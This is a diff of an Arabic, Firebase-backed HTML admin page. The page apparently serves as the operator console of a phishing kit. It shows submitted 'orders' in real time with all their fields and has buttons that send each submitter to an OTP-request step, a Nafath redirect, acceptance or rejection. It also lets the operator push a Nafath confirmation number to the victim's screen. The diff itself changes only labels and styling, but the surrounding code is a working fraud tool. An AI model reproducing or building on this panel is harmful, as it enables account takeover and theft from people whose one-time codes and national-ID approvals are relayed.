@@ -2,14 +2,14 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>لوحة التحكم الاحترافية | تري</title>
+    <title>لوحة التحكم | الإدارة</title>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; padding: 20px; }
-        .card { background: white; border-radius: 15px; padding: 20px; margin-bottom: 15px; position: relative; border-right: 8px solid #ddd; transition: 0.3s; }
+        .card { background: white; border-radius: 15px; padding: 20px; margin-bottom: 15px; border-right: 8px solid #ddd; transition: 0.3s; }
         .is-new { border-right: 8px solid #00ff9d !important; box-shadow: 0 0 15px rgba(0, 255, 157, 0.3); }
-        .data-row { margin: 8px 0; border-bottom: 1px solid #eee; padding-bottom: 5px; font-size: 14px; }
+        .data-row { margin: 8px 0; border-bottom: 1px solid #eee; padding-bottom: 5px; }
         .actions { margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap; }
         button { padding: 10px 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
         .btn-accept { background: #28a745; color: white; }
@@ -21,10 +21,10 @@
 </head>
 <body>
 
-<h2 style="text-align:center;">نظام إدارة الطلبات المباشر 🔔</h2>
+<h2 style="text-align:center;">إدارة الطلبات المباشرة 🔔</h2>
 <audio id="bell" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3"></audio>
 
-<div id="orders-list">جاري الانتظار...</div>
+<div id="orders-list">بانتظار الطلبات...</div>
 
 <script>
     const firebaseConfig = {
@@ -38,18 +38,18 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    let firstLoad = true;
     let viewed = JSON.parse(localStorage.getItem('viewed') || '[]');
+    let isFirst = true;
 
     db.collection("orders").onSnapshot((snapshot) => {
-        const list = document.getElementById('orders-list');
-        if (!firstLoad && snapshot.docChanges().some(c => c.type === "added")) document.getElementById('bell').play();
-        firstLoad = false;
+        if (!isFirst && snapshot.docChanges().some(c => c.type === "added")) document.getElementById('bell').play();
+        isFirst = false;
 
         let docs = [];
         snapshot.forEach(doc => docs.push({id: doc.id, ...doc.data()}));
         docs.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
 
+        const list = document.getElementById('orders-list');
         list.innerHTML = "";
         docs.forEach(data => {
             const isNew = !viewed.includes(data.id);
@@ -59,14 +59,14 @@
             list.innerHTML += `
                 <div class="card ${isNew?'is-new':''}" onclick="markRead('${data.id}')">
                     ${fields}
-                    <div style="color:blue; margin:10px 0;">الحالة: ${data.status || 'قيد الانتظار'}</div>
+                    <div style="color:blue; margin:10px 0;">الحالة: ${data.status || 'قيد المعالجة'}</div>
                     <div class="actions">
-                        <button class="btn-accept" onclick="update('${data.id}','SUCCESS','تم القبول')">قبول</button>
-                        <button class="btn-otp" onclick="update('${data.id}','GO_TO_OTP','طلب OTP')">طلب OTP</button>
-                        <button class="btn-nafath" onclick="update('${data.id}','GO_TO_NAFATH','تحويل نفاذ')">نفاذ</button>
-                        <button class="btn-reject" onclick="update('${data.id}','GO_TO_REJECT','رفض')">رفض</button>
+                        <button class="btn-accept" onclick="update('${data.id}','SUCCESS','تم قبول طلبك')">قبول</button>
+                        <button class="btn-otp" onclick="update('${data.id}','GO_TO_OTP','طلب كود التحقق')">طلب OTP</button>
+                        <button class="btn-nafath" onclick="update('${data.id}','GO_TO_NAFATH','تحويل لنفاذ')">نفاذ</button>
+                        <button class="btn-reject" onclick="update('${data.id}','GO_TO_REJECT','نعتذر، الطلب مرفوض')">رفض</button>
                         <input type="number" id="n-${data.id}" placeholder="الرقم" value="${data.nafath_code||''}">
-                        <button style="background:#333;color:white" onclick="sendN('${data.id}')">إرسال نفاذ</button>
+                        <button style="background:#333;color:white" onclick="sendN('${data.id}')">إرسال رقم نفاذ</button>
                     </div>
                 </div>`;
         });
@@ -74,8 +74,8 @@
 
     async function update(id, step, msg) { await db.collection("orders").doc(id).update({ next_step: step, status: msg }); }
     async function sendN(id) { 
-        const c = document.getElementById('n-'+id).value;
-        await db.collection("orders").doc(id).update({ nafath_code: c, next_step: 'SHOW_NAFATH_CODE', status: 'أرسل رقم نفاذ: '+c }); 
+        const v = document.getElementById('n-'+id).value;
+        await db.collection("orders").doc(id).update({ nafath_code: v, next_step: 'SHOW_NAFATH_CODE', status: 'تم إرسال رقم نفاذ: '+v }); 
     }
     function markRead(id) { if(!viewed.includes(id)) { viewed.push(id); localStorage.setItem('viewed', JSON.stringify(viewed)); } }
 </script>
